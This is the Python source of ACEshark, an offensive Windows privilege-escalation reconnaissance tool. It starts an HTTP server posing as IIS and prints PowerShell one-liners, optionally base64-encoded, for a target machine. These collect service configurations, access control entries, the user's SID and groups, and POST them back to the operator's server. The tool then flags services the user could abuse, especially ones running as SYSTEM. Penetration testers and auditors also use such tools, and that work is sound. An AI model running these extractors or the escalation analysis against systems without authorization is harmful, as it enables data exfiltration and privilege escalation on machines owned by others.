#!/usr/bin/env python3
# 
# Author: Panagiotis Chartas (t3l3machus)
# https://github.com/t3l3machus

from sddl_parser import parse_ace
import re, urllib.parse, argparse, base64, os, ssl, socket
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
from ipaddress import ip_address
from time import sleep
from pyperclip import copy as copy2cb

''' Colors '''
MAIN = '\033[38;5;50m'
GREEN = '\033[38;5;82m'
BLUE = '\033[0;38;5;12m'
LPURPLE = '\033[0;38;5;201m'
ORNG = '\033[0;38;5;214m'
ORANGEB = '\033[1;38;5;214m'
PURPLE = '\033[0;38;5;141m'
RED = '\033[1;31m'
RST = '\033[0m'
BOLD = '\033[1m'
PL = f'{GREEN}+{RST}'
INPUT = f'[{ORNG}Input{RST}]'
INFO = f'[{MAIN}Info{RST}]'
ERR = f'[{RED}Error{RST}]'
DEBUG = f'[{ORNG}Debug{RST}]'
OOPS = f'[{RED}Oops!{RST}]'
IMP = f'[{ORNG}Important{RST}]'


def do_nothing():
	pass


def valid_port(value):
	port = int(value)
	if port < 1 or port > 65535:
		raise argparse.ArgumentTypeError(f"Port number must be between 1 and 65535, got {port}.")
	return port


# -------------- Arguments -------------- #
parser = argparse.ArgumentParser(
	description="ACEshark is a utility designed for rapid extraction and analysis of Windows service configurations and Access Control Entries, eliminating the need for tools like accesschk.exe or other non-native binaries."
)
basic_group = parser.add_argument_group('BASIC OPTIONS')
basic_group.add_argument("-s", "--server-address", action="store", help = "Your server IP or domain name. This option cannot be used with -f.", type = str)
basic_group.add_argument("-p", "--port", action="store", help="HTTP / HTTPS server port (default: 80 / 443).", type=valid_port, default=None)
basic_group.add_argument("-c", "--certfile", action="store", help="Optional: Path to the TLS certificate for enabling HTTPS.")
basic_group.add_argument("-k", "--keyfile", action="store", help="Optional: Path to the private key for the TLS certificate.")
basic_group.add_argument("-f", "--file-input", action="store", help = "ACEshark creates log files every time you run the extractor script on a machine (stored in ~/.ACEshark). Use this option to regenerate a services config analysis from a log file. This option cannot be used with -s.", type = str)

modes_group = parser.add_argument_group('MODES')
modes_group.add_argument("-i", "--interesting-only", action="store_true", help = "List only those service ACEs that can potentially be abused by your user, based on their SID and group membership, with at least (WRITE_PROPERTY AND CONTROL_ACCESS) or GENERIC_ALL privileges.")
modes_group.add_argument("-g", "--great-candidates", action="store_true", help = "Similar to --interesting-only but with stricter criteria. A service is labeled as a great candidate for privilege escalation if the service's START_TYPE == DEMAND_START AND TYPE == WIN32_OWN_PROCESS AND your user has (WRITE_PROPERTY AND CONTROL_ACCESS) OR GENERIC_ALL privileges.")
modes_group.add_argument("-a", "--audit", action="store_true", help = "Audit mode. Analyzes all service ACEs without searching for user-specific abusable services (Long output). This option also downgrades the extractor script, omitting the retrieval of the current user's SID and group membership information. By default, the WRITE_PROPERTY and CONTROL_ACCESS rights are highlighted for simplicity when they are present. ")
modes_group.add_argument("-x", "--custom-mode", action="store", help = "Provide a comma-separated list of integers representing the generic access rights to match. Only service ACEs that your user may be able to abuse, based on their SID and group membership matching the provided rights, will be listed. Use -lg to list all predefined generic access rights.", type = str)
modes_group.add_argument("-lg", "--list-generic", action="store_true", help = "List all predefined generic access rights.")

extractor_group = parser.add_argument_group('EXTRACTOR MODIFICATIONS')
extractor_group.add_argument("-gs", "--get-service", action="store_true", help = "This option modifies the extractor script to use Get-Service for listing available services. While cleaner, it may not work with a low-privileged account. The default Get-ChildItem approach, though less elegant, is more likely to succeed in most cases.")
extractor_group.add_argument("-e", "--encode", action="store_true", help = "Generate Base64-encoded services configuration extractor script instead of raw PowerShell.")
extractor_group.add_argument("-z", "--config-filename", action="store", default="sc.txt", help = "Change the temporary filename used to store the extracted services configuration before transferring the data via HTTP (default: sc.txt).", type = str)
extractor_group.add_argument("-d", "--delimiter", action="store", default="#~", help = "Change the delimiter value used for service config serialization (default: #~). Use this option cautiously. It is rarely needed.", type = str)

output_group = parser.add_argument_group('OUTPUT')
output_group.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup.")
output_group.add_argument("-v", "--verbose", action="store_true", help = "Print the user's SID and group membership info as well (not applicable in Audit mode).")

args = parser.parse_args()

if not args.list_generic:

	# Services config source control
	if not args.server_address and not args.file_input:
		exit(f'\n{DEBUG} You must specify either -s, --server-address or -f, --file input.')
	elif args.server_address and args.file_input:
		exit(f'\n{DEBUG} Only one option can be used: -s, --server-address or -f, --file input')

	# Mode selection control
	custom_mode = True if args.custom_mode else False
	if (args.interesting_only + args.audit + args.great_candidates + custom_mode) > 1:
		exit(f'\n{DEBUG} A single mode can be used at a time:\n   -i, --interesting-only\n   -g, --great-candidates\n   -a, --audit\n   -x, --custom-mode')
	elif (args.interesting_only + args.audit + args.great_candidates + custom_mode) == 0:
		exit(f'\n{DEBUG} Select a mode:\n   -i, --interesting-only\n   -g, --great-candidates\n   -a, --audit\n   -x, --custom-mode')

	mode = 'audit' if args.audit else 'pe'


	# Check if both cert and key files were provided
	tls = False
	if (args.certfile and not args.keyfile) or (args.keyfile and not args.certfile):
		exit(f'{DEBUG} TLS support seems to be misconfigured (missing key or cert file).')
	elif args.certfile and args.keyfile:
		tls = True


	def validate_host_address(addr):

		addr_verified = False
		try:
			# Check if valid IP address
			addr_verified = str(ip_address(addr))

		except ValueError:

			# Check if valid hostname
			if len(addr) > 255:
				addr_verified = False
				print(f'{DEBUG} Hostname length greater than 255 characters.')
				return False
			
			if addr[-1] == ".":
				addr = addr[:-1]  # Strip trailing dot (used to indicate an absolute domain name and technically valid according to DNS standards)

			disallowed = re.compile(r"[^A-Z\d-]", re.IGNORECASE)
			if all(len(part) and not part.startswith("-") and not part.endswith("-") and not disallowed.search(part) for part in addr.split(".")):
				# Check if hostname is resolvable
				try:
					socket.gethostbyname(addr)
					addr_verified = addr
				except:
					pass			
				
		return addr_verified


	if not args.file_input:
		valid_addr = validate_host_address(args.server_address)
		exit(f'{DEBUG} Server address is not resolvable. Check input and try again.') if not valid_addr else do_nothing()


	# Global
	DEBUG_ENDPOINT = '_debug_'
	POST_DATA_ENDPOINT = 'ACEshark'
	SRVS_CONF_FILENAME = args.config_filename
	DELIMITER = args.delimiter
	server_address = args.server_address
	port = args.port if args.port else (443 if tls else 80)
	ACEshark_logs_dir = os.path.join(os.path.expanduser("~"), ".ACEshark")
	FIN = False

	# Extractor Script Templates
	# Using Get-ChildItem to list services (default - More likely to work with a low-privileged account).
	GC_audit_template = f'$f=[System.IO.Path]::Combine($env:ALLUSERSPROFILE, "{SRVS_CONF_FILENAME}"); Set-Content -Path $f -Value ""; Get-ChildItem -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services" | % {{ $c=sc.exe sdshow $_.PSChildName; $x=(sc.exe qc $_.PSChildName | ForEach-Object {{ $_.Trim() }}) -join "{DELIMITER}";Add-Content -Path $f -Value "$($_.PSChildName)::$x`n$c" }}; $d=Get-Content -Path $f -Raw; IRM -Uri "{"http" if not tls else "https"}://{server_address}:{port}/{POST_DATA_ENDPOINT}" -Method POST -Body @{{data=$d}}; del $f'

	GC_pe_template = f'$f=[System.IO.Path]::Combine($env:ALLUSERSPROFILE, "{SRVS_CONF_FILENAME}"); Set-Content -Path $f -Value ""; Add-Content -Path $f -Value (([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value)); Add-Content -Path $f -Value ((whoami /groups) + "</groups>"); Get-ChildItem -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services" | % {{ $c=sc.exe sdshow $_.PSChildName; $x=(sc.exe qc $_.PSChildName | ForEach-Object {{ $_.Trim() }}) -join "{DELIMITER}"; Add-Content -Path $f -Value "$($_.PSChildName)::$x`n$c" }}; $d=Get-Content -Path $f -Raw; IRM -Uri "{"http" if not tls else "https"}://{server_address}:{port}/{POST_DATA_ENDPOINT}" -Method POST -Body @{{data=$d}}; del $f'

	# Using Get-Service to list services (Cleaner, but won't work with a low-privileged account).
	GS_audit_template = f'$f=[System.IO.Path]::Combine($env:ALLUSERSPROFILE, "{SRVS_CONF_FILENAME}"); Set-Content -Path $f -Value ""; Get-Service | % {{ $c=sc.exe sdshow $_.Name; $x=(sc.exe qc $_.Name | ForEach-Object {{ $_.Trim() }}) -join "{DELIMITER}";Add-Content -Path $f -Value "$($_.Name)::$x`n$c" }}; $d=Get-Content -Path $f -Raw; IRM -Uri "{"http" if not tls else "https"}://{server_address}:{port}/{POST_DATA_ENDPOINT}" -Method POST -Body @{{data=$d}}; del $f'

	GS_pe_template = f'$f=[System.IO.Path]::Combine($env:ALLUSERSPROFILE, "{SRVS_CONF_FILENAME}"); Set-Content -Path $f -Value ""; Add-Content -Path $f -Value (([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value)); Add-Content -Path $f -Value ((whoami /groups) + "</groups>"); Get-Service | % {{ $c=sc.exe sdshow $_.Name; $x=(sc.exe qc $_.Name | ForEach-Object {{ $_.Trim() }}) -join "{DELIMITER}"; Add-Content -Path $f -Value "$($_.Name)::$x`n$c" }}; $d=Get-Content -Path $f -Raw; IRM -Uri "{"http" if not tls else "https"}://{server_address}:{port}/{POST_DATA_ENDPOINT}" -Method POST -Body @{{data=$d}}; del $f'

	active_template = (GC_audit_template if mode == 'audit' else GC_pe_template) if not args.get_service else (GS_audit_template if mode == 'audit' else GS_pe_template)


	# ACE object types
	well_known_sids = {
		"AU": "Authenticated Users",
		"BA": "Built-in Administrators",
		"BG": "Built-in Guests",
		"BO": "Backup Operators",
		"BU": "Built-in Users",
		"CA": "Certificate Server Administrators",
		"CG": "Creator Group",
		"CO": "Creator Owner",
		"DA": "Domain Administrators",
		"DC": "Domain Computers",
		"DD": "Domain Controllers",
		"DG": "Domain Guests",
		"DU": "Domain Users",
		"EA": "Enterprise Administrators",
		"ED": "Enterprise Domain Controllers",
		"IU": "Interactive Users",
		"LA": "Local Administrator",
		"LG": "Local Guest",
		"LS": "Local Service",
		"LU": "Network Logon User",
		"MO": "Creator Owner Server",
		"MU": "Creator Group Server",
		"NO": "Network Configuration Operators",
		"NS": "Network Service",
		"NU": "Network",
		"OW": "Owner Rights",
		"PS": "Personal Self",
		"PU": "Power Users",
		"RC": "Restricted Code",
		"RE": "Restricted Network",
		"RO": "Replica Server Operators",
		"RU": "Alias to allow previous Windows 2000",
		"SA": "Schema Administrators",
		"SI": "System",
		"SO": "Server Operators",
		"SU": "Service Logon User",
		"WD": "Everyone",
		"WG": "Windows Authorization Access Group",
		"WO": "Well-known group object",
		"WR": "World Access Group",
		"YS": "Terminal Server Users",
		"VA": "Virtual Account",
		"UI": "NTLM Authentication",
		# Standard accounts
		"SY": "Local System",
		"LS": "Local Service",
		"NS": "Network Service",
		"BA": "Built-in Administrators",
		"BU": "Built-in Users",
		"BG": "Built-in Guests",
		"PU": "Power Users",
		"AO": "Account Operators",
		"SO": "Server Operators",
		"PO": "Print Operators",
		"BO": "Backup Operators",
		"RE": "Replicator"
	}


	ace_types = {	
		0: "ACCESS_ALLOWED",
		1: "ACCESS_DENIED",
		5: "ACCESS_ALLOWED_OBJECT",
		6: "ACCESS_DENIED_OBJECT",
		7: "SYSTEM_AUDIT_OBJECT",
		8: "SYSTEM_ALARM_OBJECT",
		9: "ACCESS_ALLOWED_CALLBACK",
		10: "ACCESS_DENIED_CALLBACK",
		11: "ACCESS_ALLOWED_CALLBACK_OBJECT",
		13: "SYSTEM_AUDIT_CALLBACK",
		17: "SYSTEM_MANDATORY_LABEL",
		18: "SYSTEM_RESOURCE_ATTRIBUTE",
		19: "SYSTEM_SCOPED_POLICY_ID",
		20: "SYSTEM_PROCESS_TRUST_LABEL",
		21: "SYSTEM_ACCESS_FILTER"
	}


generic_access_rights = {
	1: "CREATE_CHILD",
	2: "DELETE_CHILD",
	4: "LIST_CHILDREN",
	8: "SELF_WRITE",
	16: "READ_PROPERTY",
	32: "WRITE_PROPERTY",
	64: "DELETE_TREE",
	128: "LIST_OBJECT",
	256: "CONTROL_ACCESS",
	65536: "STANDARD_DELETE",
	983040 : "STANDARD_RIGHTS_REQUIRED",
	131072: "READ_CONTROL",
	262144: "WRITE_DAC",
	524288: "WRITE_OWNER",
	983551: "SERVICE_ALL_ACCESS",
	1048576: "SYNCHRONIZE",
	2031616: "STANDARD_RIGHTS_ALL",
	268435456: "GENERIC_ALL",
	536870912: "GENERIC_EXECUTE",
	1073741824: "GENERIC_WRITE",
	2147483648: "GENERIC_READ"
}

if args.list_generic:
	for key, val in generic_access_rights.items():
		print(f' {key} : {val}')
	exit()


target_generic_rights = []
if args.custom_mode:
	try:
		custom_rights = args.custom_mode.split(',')
		custom_rights = [r.strip() for r in custom_rights if r.strip()]
		if not custom_rights:
			raise
		for r in custom_rights:
			i = int(r)
			if i not in generic_access_rights.keys():
				exit(f'{DEBUG} Int value {i} not in predefined generic access rights. Feel free to submit a pull request if you believe something is missing.')
				continue
			target_generic_rights.append(i)
	except Exception as e:
		exit(f'{DEBUG} Invalid generic access rights value. Please check your input and try again.')



def extract_config(c_str):
	config_dict = {'status': 1}
	config_l = c_str.split(f"{DELIMITER}")
	config_l = [l.strip() for l in config_l]
	stat = config_l[0].replace('+', ' ')
	if re.search('OpenService FAILED', stat):
		return {'status': 0, 'reason': stat.split('FAILED ')[1]}

	c_types = ['TYPE', 'START_TYPE', 'BINARY_PATH_NAME', 'SERVICE_START_NAME']
	
	# Extract service config values
	for line in config_l:
		for c in c_types:
			if line.startswith(c):
				try:
					val = line.split(":", 1)[1]
					val = val.replace('+', ' ').strip()
					val = re.sub(r'\s+', ' ', val)
					if c in ['TYPE', 'START_TYPE']:
						val = val.split(' ', 1)[1]
				except KeyError:
					val = ''
				val = 'UNDISCLOSED' if not val.strip() else val
				config_dict[c] = val
				c_types.remove(c)

		if c_types:
			for c in c_types:
				config_dict[c] = 'UNDISCLOSED'
	return config_dict



def extract_object_name(sid, user_groups):
	try:
		tmp = user_groups.split(sid)[0]
		name = tmp.rsplit('\n', 1)[1]
		name = re.sub(r'\s+', ' ', name)
		return name.strip()
	except:
		return ''



def write_to_timestamped_file(content, client_addr):
	timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
	file_name = f"{client_addr}_{timestamp}.ACEshark.log"
	file_path = os.path.join(ACEshark_logs_dir, file_name)
	
	with open(file_path, 'w') as file:
		file.write(content)
	
	print(f"{INFO} Configuration captured in {ORNG}{file_path}{RST} - You can use this file to regenerate the services config analysis if required (-f).")



def extract_rights(ace):
	global target_generic_rights
	rights_str = []
	rights_int = []
	full_control = False
	target_gen_access_rights = [32, 256, 536870912, 1073741824] if not target_generic_rights else target_generic_rights

	for r in ace.rights:
		if r.value in generic_access_rights.keys():
			val = r.value
			if val in [268435456, 983551]: # GENERIC_ALL, SERVICE_ALL_ACCESS 
				full_control = True
				rights_str.append(f'{RED}{generic_access_rights[r.value]}{RST}')

			# Highlight interesting
			elif val in target_gen_access_rights: 
				rights_int.append(val)
				rights_str.append(f'{GREEN}{generic_access_rights[r.value]}{RST}')
			else:
				rights_str.append(generic_access_rights[r.value])
		else:
			rights_str.append(f'{RED}{r.value}{RST}')
	return [rights_str, full_control, rights_int] 



def encodeExtractor(payload):
	enc_payload = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
	return enc_payload



def extractGroups(url_decoded_data_l):
	user_groups = []
	c = 0
	for l in url_decoded_data_l:
		if l.strip() == '</groups>':
			break
		else:
			user_groups.append(l)
			c += 1
	return [user_groups, c]



def audit_services_config(url_decoded_data_l, client_addr = False):
	global FIN, target_generic_rights
	print(f'{INFO} Initiating services audit.')

	if not args.audit:
		user_sid = url_decoded_data_l.pop(0)
		print(f'[{ORNG}User SID{RST}] {user_sid}') if args.verbose else do_nothing()
		tmp = extractGroups(url_decoded_data_l)
		user_groups = '\n'.join(tmp[0]).replace('+', ' ')		
		c = tmp[1]
		services_config = url_decoded_data_l[c + 1:]
	else:
		user_sid, user_groups = '', ''
		services_config = url_decoded_data_l
	print(f'[{ORNG}User Groups{RST}]\n {user_groups}') if (args.verbose and not args.audit) else do_nothing()
	
	for i in range(0, len(services_config) - 1, 2):
		tmp = services_config[i].split("::")
		service = tmp[0].replace('+', ' ')
		config = tmp[1].strip()
		config_dict = extract_config(config)
		if not config_dict['status']:
			reason = config_dict['reason'].strip(":")
			print(f'{BOLD}[{RED}{service}{RST}] Service config query failed. Error Code: {reason}')
			continue
		user_account = config_dict['SERVICE_START_NAME']
		service_type = config_dict['TYPE']
		start_type = config_dict['START_TYPE']
		binpath = config_dict['BINARY_PATH_NAME']					
		aces = services_config[i + 1]
		aces_list = re.findall('\\([0-9A-Za-z;\\-]*\\)', aces)

		# Initialize the ACE parser
		print(f'{BOLD}[{LPURPLE}{service}{RST}][{service_type}][{start_type}] Running as user: {BOLD}{user_account}{RST}')
		
		for item in aces_list:
			member = False
			ace_target = ''
			
			try:
				obj_id = item.strip('()').rsplit(';;;')[1]
				if len(obj_id) == 2:
					ace_target = well_known_sids[obj_id.upper()]	
			except:
				pass
			
			wellknown = True if ace_target else False
			
			try:
				interesting_or_abusable = False
				ace = parse_ace(item)
				ace_type = ace.type.value
				if ace_type == 1 and mode == 'pe': # ACCESS_DENIED
					continue
				if ace_type in ace_types.keys():
					ace_type = ace_types[ace_type]
				sid = ace.sid
				
				if isinstance(sid, str):
					sid_val = sid
				else:
					sid_val = sid.value
				
				legit_sid = sid_val.startswith('S')
				sid = ace_target if legit_sid and ace_target else sid
				obj_name = extract_object_name(sid, user_groups) if not wellknown and legit_sid else ''
				great_candidate = False
				c = 0
				
				# Check if user has any rights on the service
				if args.audit or (re.search(f'{sid_val} ', user_groups) or sid_val.upper() == user_sid.upper().strip()):
					member = True
					rights_detailed = extract_rights(ace) # -> STR LIST rights, BOOL full_control, INT LIST rights
					display_rights = 'None' if not rights_detailed[0] else '\n                  '.join(rights_detailed[0])								
					great_candidate = True if rights_detailed[1] or (service_type == 'WIN32_OWN_PROCESS' and start_type == 'DEMAND_START') else False
					interesting_or_abusable = True
					if not rights_detailed[0]:
						interesting_or_abusable = False
					else:
						target_gen_access_rights = [32, 256] if not args.custom_mode else target_generic_rights
						for i in target_gen_access_rights:
							if i not in rights_detailed[2]:
								interesting_or_abusable = False
								break

					great_candidate = True if (member and interesting_or_abusable and not args.custom_mode and service_type == 'WIN32_OWN_PROCESS' and start_type == 'DEMAND_START') else False

				if args.audit or (((member and interesting_or_abusable and (args.interesting_only or args.custom_mode)) or (args.great_candidates and great_candidate))):
					print() if c == 0 else do_nothing()
					print(f'      [{PL}] Analyzing ACE {item}')
					print(f'          ACE Type: {BOLD}{ace_type}{RST}')							
					if obj_name:
						print(f'          User / Group: {BOLD}{BLUE}{obj_name}{RST} ({sid_val})')
					else:
						print(f'          User / Group: {BOLD}{sid}{RST}' if sid_val == sid else f'          User / Group: {BOLD}{sid}{RST} ({sid_val})')
					print(f'          Rights: {display_rights}')
					print(f'          Binary Path: {binpath}')

					if not args.audit and not args.custom_mode:
						print(f'          {ORNG}Potentially Abusable{" - Great Candidate" if great_candidate else ""}!{RST}') if interesting_or_abusable else do_nothing()
						if user_account.strip() in ['LocalSystem', 'NT+AUTHORITY\\System', 'NT AUTHORITY\\System']:
							print(f'          {RED}Running as SYSTEM{RST}') if interesting_or_abusable else do_nothing()
					print()
				c += 1
			except Exception as e:
				print(f'{ERR} {e}')
				continue
	
	if not args.file_input:
		try:
			if not args.audit:
				url_decoded_data_l.insert(0, user_sid)
			url_decoded_data_l.insert(0, 'audit' if args.audit else 'pe')
			url_decoded_data_l.insert(0, '#!ACEshark_log')
			write_to_timestamped_file('\n'.join(url_decoded_data_l), client_addr)
		except Exception as e:
			print(f'{ERR} Failed to write services configuration to a file: {e} - Moving on.')
		FIN = True



class _HttpServer(BaseHTTPRequestHandler):
		
	def do_GET(self):
		
		try:	
			self.server_version = "Microsoft-IIS/10"
			self.sys_version = ""	

			if self.path == f'/{DEBUG_ENDPOINT}':
				self.send_response(200)
				self.send_header('Content-type', 'text/javascript; charset=UTF-8')
				self.send_header('Access-Control-Allow-Origin', '*')
				self.end_headers()									
				self.wfile.write(bytes('It works! Who would have thought?', "utf-8"))
		except:
			pass
		
		
	def do_POST(self):
			
		try:
			self.server_version = "Microsoft-IIS/10"
			self.sys_version = ""	

			try:
				client_addr = self.client_address[0]
			except:
				client_addr = 'null_client'
				  
			if self.path == f'/{POST_DATA_ENDPOINT}':
				self.send_response(200)
				self.send_header('Access-Control-Allow-Origin', '*')
				self.send_header('Content-Type', 'text/plain')
				self.end_headers()
				self.wfile.write(b'OK')
				content_len = int(self.headers.get('Content-Length'))
				post_data = self.rfile.read(content_len)
				decoded_data = post_data.decode('utf-8', 'ignore')
				url_decoded_data = urllib.parse.unquote(decoded_data).strip()
				print(f'{INFO} Data retrieved! Processing...')
				url_decoded_data_l = url_decoded_data.split('\n')
				url_decoded_data_l.pop(0) # data=
				audit_services_config(url_decoded_data_l, client_addr)	
				print(f'{IMP} Even if a service\'s ACEs suggest it\'s a great PE candidate, other Windows security features may still block its abuse.')			
				print(f'{INFO} Done.')
				exit()

		except Exception as e:
			print(f'{ERR} {e}')
			pass	



def read_file_to_list(file_path):
	try:
		with open(file_path, 'r') as file:
			content = file.read().splitlines()
			signature = content.pop(0).strip()
			if signature != '#!ACEshark_log':
				print(f'{DEBUG} This doesn\'t appear to be an ACEshark log file.')
				return []
			mode = content.pop(0).strip()
			return [mode, content]
	except FileNotFoundError:
		print(f"{ERR} The file at {file_path} was not found.")
		return []
	except IOError as e:
		print(f"{ERR} Failed to read file {file_path}: {e}")
		return []



def print_banner():
	print('''
   ┏┓┏┓┏┓ ┓     ┓ 
   ┣┫┃ ┣ ┏┣┓┏┓┏┓┃┏
   ┛┗┗┛┗┛┛┛┗┗┻┛ ┛┗
     by t3l3machus
''')



def create_ACEshark_log_folder():

	try:
		if not os.path.exists(ACEshark_logs_dir):
			os.makedirs(ACEshark_logs_dir)
	except:
		print(f'{ERR} Failed to create logs dir {ACEshark_logs_dir}.')



def main():
	global active_template
	create_ACEshark_log_folder()
	print_banner() if not args.quiet else do_nothing()

	if args.file_input:
		extractor_args = [
			action.dest for action in extractor_group._group_actions
			if getattr(args, action.dest) != action.default
		]
		for val in extractor_args:
			print(f'{INFO} Ignoring argument --{val}.')
		for key, val in {'--port': args.port, '--certfile': args.certfile, '--keyfile': args.keyfile}.items():
			print(f'{INFO} Ignoring argument {key}.') if val else do_nothing()

		log = read_file_to_list(args.file_input)
		exit() if not log else do_nothing()
		log_mode = log[0]
		data = log[1]

		if (mode == 'pe' and log_mode == 'audit'):
			exit(f'{DEBUG} This log was generated in Audit mode and cannot be used for service analysis in -i (--interesting-only), -x (--custom-mode), or -g (--great-candidates) modes. FYI, the opposite is possible.')

		elif mode == 'pe' and (mode == log_mode):
			audit_services_config(data)

		elif mode == 'audit':
			if log_mode == 'pe':
				data.pop(0) # user_sid
				tmp = extractGroups(data)
				c = tmp[1]
				url_decoded_data_l = data[c + 1:]
				audit_services_config(url_decoded_data_l)
			else:
				audit_services_config(data)

		exit()

	try:	
		httpd = HTTPServer(('0.0.0.0', port), _HttpServer)

		if tls:
			context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
			context.load_cert_chain(certfile = args.certfile, keyfile = args.keyfile)
			httpd.socket = context.wrap_socket(sock = httpd.socket, server_side= True)

	except OSError:	
		exit(f'{ERR} Port {port} seems to already be in use.\n')

	except Exception as e:
		exit(f'[{DEBUG}] TLS implementation failed: {e}.\n')

	Thread(target = httpd.serve_forever, args = (), daemon=True).start()
	print(f'{INFO} Http server started. Try {ORNG}{"http" if not tls else "https"}://{args.server_address}:{port}/{DEBUG_ENDPOINT}{RST} if you wish to check if reachable.')
	print(f'{IMP} If your TLS certificate is untrusted, you\'ll have to bypass certificate validation for this to work.') if tls else do_nothing()
	print(f'{INFO} Run the following extractor script (or similar) on the target machine to retrieve the configuration of all services:')
	active_template = encodeExtractor(active_template) if args.encode else active_template
	print(f'{GREEN}{active_template}{RST}') 

	try:
		copy2cb(active_template)
		print(f'{ORNG}Copied to clipboard!{RST}')
	except:
		print(f'{RED}Copy to clipboard failed. Please do it manually.{RST}')

	print(f'\n{INFO} Waiting for script execution on the target, be patient...')

	while not FIN:
		try:
			sleep(1)
			continue
		except KeyboardInterrupt:
			exit()
	else:
		return
	
if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		exit(f'{OOPS} Something went really wrong: {e}')
